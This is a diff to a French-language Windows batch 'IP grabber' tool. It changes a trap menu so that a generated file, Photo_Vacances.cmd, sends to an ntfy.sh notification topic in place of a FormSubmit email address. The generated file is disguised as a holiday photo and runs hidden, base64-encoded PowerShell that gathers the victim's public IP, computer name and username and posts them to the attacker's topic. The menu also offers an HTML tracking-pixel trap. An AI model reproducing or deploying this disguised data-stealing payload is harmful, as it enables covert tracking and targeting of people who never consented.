@@ -1711,7 +1711,7 @@ set "base_ip=AUTO"
 goto start_lan_scan
 
 :gm_traps_menu
-set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE EMAIL - Son IP vous est envoyee par email~La cible clique un lien dans le mail"
+set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE NTFY - Notif instantanee sur navigateur/mobile~La cible execute le CMD vous recevez l'IP sur ntfy.sh"
 call :DynamicMenu "CHOISIR UN PIEGE POUR CAPTURER SON IP" "%trap_q%" "NONUMS"
 set "gm_ch=%errorlevel%"
 if "%gm_ch%"=="0" goto cyber_ip_grabber
@@ -1902,38 +1902,36 @@ REM --- [4] Email Trap ---
 cls
 echo.
 echo  ================================================
-echo   [EMAIL] PIEGE PAR E-MAIL
+echo   [NOTIF] PIEGE NTFY.SH - NOTIFICATION INSTANTANEE
 echo  ================================================
 echo.
 echo  [i] Genere un fichier Photo_Vacances.cmd sur le Bureau.
-echo      Quand votre cible l'execute, vous recevez un email
+echo      Quand votre cible l'execute, vous recevez une notif
 echo      avec son IP, nom de machine et session.
 echo.
-echo  [!] 1er envoi : confirmez d'abord l'adresse dans le
-echo      mail de validation de FormSubmit.
+echo  [i] Choisissez un topic unique (ex: alex-trap-7842)
+echo      Puis ouvrez https://ntfy.sh/VOTRE-TOPIC dans votre
+echo      navigateur ou l'app ntfy (Android/iOS) pour recevoir.
 echo.
-call :InputWithEsc "Votre e-mail de reception : " grab_email
+call :InputWithEsc "Votre topic ntfy.sh : " grab_email
 if errorlevel 1 goto gm_traps_menu
 if not defined grab_email goto gm_traps_menu
 set "PS_EM=%TEMP%\ig_em_%RANDOM%.ps1"
 set "gemail=!grab_email!"
->> "%PS_EM%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
->> "%PS_EM%" echo $u = 'https://formsubmit.co/%gemail%'
->> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{IP=`$ip;Machine=`$env:COMPUTERNAME;Session=`$env:USERNAME;_subject='Cible Identifiee';_captcha='false'}; Invoke-RestMethod -Uri `$u -Method Post -Body `$b -UseBasicParsing } catch {}"
+>> "%PS_EM%" echo $cmdPath = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
+>> "%PS_EM%" echo $ntfy = 'https://ntfy.sh/%gemail%'
+>> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$msg='IP: '+`$ip+' | PC: '+`$env:COMPUTERNAME+' | User: '+`$env:USERNAME; `$h=@{Title='Cible Identifiee';Priority='high';Tags='warning'}; Invoke-RestMethod -Uri '$ntfy' -Method Post -Body `$msg -Headers `$h -UseBasicParsing } catch {}"
 >> "%PS_EM%" echo $bytes = [System.Text.Encoding]::Unicode.GetBytes($psp)
 >> "%PS_EM%" echo $b64 = [Convert]::ToBase64String($bytes)
->> "%PS_EM%" echo $obf = "@echo off`
-`
-start /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64`
-`
-exit"
->> "%PS_EM%" echo Set-Content -Path $cmdPath -Value $obf -Encoding ASCII
+>> "%PS_EM%" echo $lines = @('@echo off', '', "start /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64", '', 'exit')
+>> "%PS_EM%" echo Set-Content -Path $cmdPath -Value $lines -Encoding ASCII
 >> "%PS_EM%" echo Write-Host '  [OK] Piege : Photo_Vacances.cmd sur le Bureau' -f Green
->> "%PS_EM%" echo Write-Host "  [i] Envoi de l'IP vers : %gemail%" -f DarkGray
->> "%PS_EM%" echo Write-Host '  [i] Quand vous recevez l''email avec l''IP,' -f Yellow
->> "%PS_EM%" echo Write-Host '      revenez et choisissez [MANUEL].' -f Yellow
+>> "%PS_EM%" echo Write-Host "  [i] Notif vers : https://ntfy.sh/%gemail%" -f Cyan
+>> "%PS_EM%" echo Write-Host '  [i] Ouvrez ce lien dans votre navigateur pour recevoir.' -f Yellow
+>> "%PS_EM%" echo Write-Host '  [i] Quand vous recevez l''IP, revenez et choisissez [MANUEL].' -f Yellow
 powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_EM%"
 if exist "%PS_EM%" del /f /q "%PS_EM%"
+start "" "https://ntfy.sh/!gemail!"
 echo.
 pause >nul
 goto gm_traps_menu
